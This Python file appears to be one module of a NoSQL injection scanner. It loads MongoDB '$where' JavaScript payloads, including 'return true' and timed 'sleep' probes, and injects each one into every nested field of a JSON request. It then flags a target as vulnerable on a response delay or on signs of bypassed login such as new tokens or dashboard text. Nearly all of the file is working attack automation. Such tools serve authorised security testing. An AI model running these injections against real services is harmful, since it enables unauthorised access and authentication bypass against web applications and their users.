import copy
import json
import time
import os
import random
import difflib
from core.logger import Logger

class JSInjection:
    def __init__(self, requester, url, method, original_data, baseline_response, target_param=None, prefix="", suffix="", time_sec=None):
        self.requester = requester
        self.url = url
        self.method = method
        self.original_data = original_data
        self.baseline = baseline_response
        self.target_param = target_param
        self.prefix = prefix
        self.suffix = suffix
        self.time_sec = time_sec 
        self.logger = Logger()
        
        self.payloads = self.load_payloads()

    def load_payloads(self):
        """Reading payloads from core/payloads.json"""
        try:
            base_dir = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
            payload_path = os.path.join(base_dir, "core", "payloads.json")
            
            with open(payload_path, "r") as f:
                data = json.load(f)
                return data.get("js_injection", [])
        except Exception as e:
            self.logger.error(f"Failed to load JS payloads: {e}")
            return [
                {"$where": "return true"},
                {"$where": "sleep(5000)"}
            ]

    def _generate_nested_payloads(self, payload):
        """ایجاد تمام حالت‌های تزریق ممکن در JSON تو در تو"""
        
        def update_recursive(original, path_list, value):
            new_obj = copy.deepcopy(original)
            current = new_obj
            
            for key in path_list[:-1]:
                if isinstance(current, dict):
                    current = current[key]
                elif isinstance(current, list) and isinstance(key, int):
                    current = current[key]
                else:
                    return None
            
            if isinstance(current, dict):
                current[path_list[-1]] = value
            elif isinstance(current, list) and isinstance(path_list[-1], int):
                if path_list[-1] < len(current):
                    current[path_list[-1]] = value
                else:
                    return None
            else:
                return None
            
            return new_obj

        def traverse_and_yield(obj, path):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    new_path = path + [k]
                    if not isinstance(v, (dict, list)):
                         attack_data = update_recursive(self.original_data, new_path, payload)
                         if attack_data:
                             path_str = ".".join(map(str, new_path))
                             yield path_str, attack_data
                    else:
                        yield from traverse_and_yield(v, new_path)
            elif isinstance(obj, list):
                for i, v in enumerate(obj):
                    new_path = path + [i]
                    if not isinstance(v, (dict, list)):
                         attack_data = update_recursive(self.original_data, new_path, payload)
                         if attack_data:
                             path_str = f"{'.'.join(map(str, path))}[{i}]" if path else f"[{i}]"
                             yield path_str, attack_data
                    else:
                         yield from traverse_and_yield(v, new_path)

        yield from traverse_and_yield(self.original_data, [])

    def run(self):
        self.logger.info(f"Starting Module: Advanced Injection (Recursive, JS, $expr)")
        if self.prefix or self.suffix:
            self.logger.info(f"Using Prefix: '{self.prefix}' | Suffix: '{self.suffix}'")
        if self.time_sec:
            self.logger.info(f"Manual Sleep Time: {self.time_sec}s")

        vulnerable = False

        if not self.original_data or not isinstance(self.original_data, (dict, list)):
            self.logger.warning("No JSON structure found to inject.")
            return False

        for raw_payload in self.payloads:
            payload = copy.deepcopy(raw_payload)
            
            if isinstance(payload, dict):
                for key, val in payload.items():
                    if key == "$where" and isinstance(val, str):
                        payload[key] = self.prefix + val + self.suffix
                    
                    if self.time_sec and isinstance(val, str) and "sleep(" in val:
                         import re
                         payload[key] = re.sub(r'sleep\(\d+\)', f'sleep({self.time_sec * 1000})', payload[key])

            for path, attack_data in self._generate_nested_payloads(payload):
                if self.target_param and self.target_param not in path:
                    continue

                payload_str = json.dumps(payload)
                print(f"\r\033[94m[?]\033[0m Injecting at '{path}' -> {payload_str}".ljust(90), end="")

                try:
                    start_time = time.time()
                    response = self.requester.send(self.url, self.method, attack_data)
                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    is_vuln = False
                    reason = ""

                    sleep_threshold = self.time_sec if self.time_sec else 5
                    
                    payload_content = str(payload)
                    if ("sleep" in payload_content or "Date" in payload_content) and elapsed_time >= sleep_threshold:
                        is_vuln = True
                        reason = f"Time Delay Detected ({round(elapsed_time, 2)}s)"
                    
                    elif self.is_successful_logic(response):
                        is_vuln = True
                        reason = "Logic/Response Change"

                    if is_vuln:
                        print("") 
                        self.logger.success("CRITICAL VULNERABILITY FOUND!")
                        self.logger.info(f"Vector: {path}")
                        self.logger.info(f"Payload: {payload_str}")
                        self.logger.info(f"Reason: {reason}")
                        vulnerable = True
                        return True

                except Exception:
                    pass
        
        print("") 
        if not vulnerable:
            self.logger.error("No Advanced/JS injection vulnerabilities found.")
        
        return vulnerable

    def is_successful_logic(self, response):
        if not response: return False
        
        if response.status_code == 200 and self.baseline.status_code != 200:
            return True
            
        success_keywords = ["token", "success", "dashboard", "welcome", "auth_token", "id", "access"]
        for word in success_keywords:
            if word in response.text.lower() and word not in self.baseline.text.lower():
                return True
        
        if response.text and self.baseline.text:
            matcher = difflib.SequenceMatcher(None, self.baseline.text, response.text)
            similarity = matcher.ratio()
            
            if similarity < 0.90:
                error_keywords = ["error", "invalid", "failed", "bad request", "forbidden", "denied", "syntax"]
                is_error = False
                for err in error_keywords:
                    if err in response.text.lower() and err not in self.baseline.text.lower():
                        is_error = True
                        break
                
                if not is_error:
                    return True
        
        return False